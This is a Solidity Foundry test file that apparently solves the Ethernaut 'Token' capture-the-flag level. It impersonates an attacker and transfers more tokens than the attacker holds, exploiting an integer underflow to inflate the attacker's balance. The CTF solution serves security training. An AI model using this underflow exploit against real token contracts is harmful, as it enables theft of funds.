// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../../src/levels/05-Token/TokenFactory.sol";
import "../../../src/core/Ethernaut.sol";

contract TokenTest is Test {
    Ethernaut ethernaut;
    address attacker = address(0xabcd);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testTokenHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token ethernautToken = Token(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // transferring more than available will underflow
        ethernautToken.transfer(address(this), 21);

        // log the new token balance of the attacker
        emit log_named_uint(
            "Balance after",
            ethernautToken.balanceOf(attacker)
        );

        // check if the attacker balance is greater than starting balance
        assertGt(ethernautToken.balanceOf(attacker), 20);
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
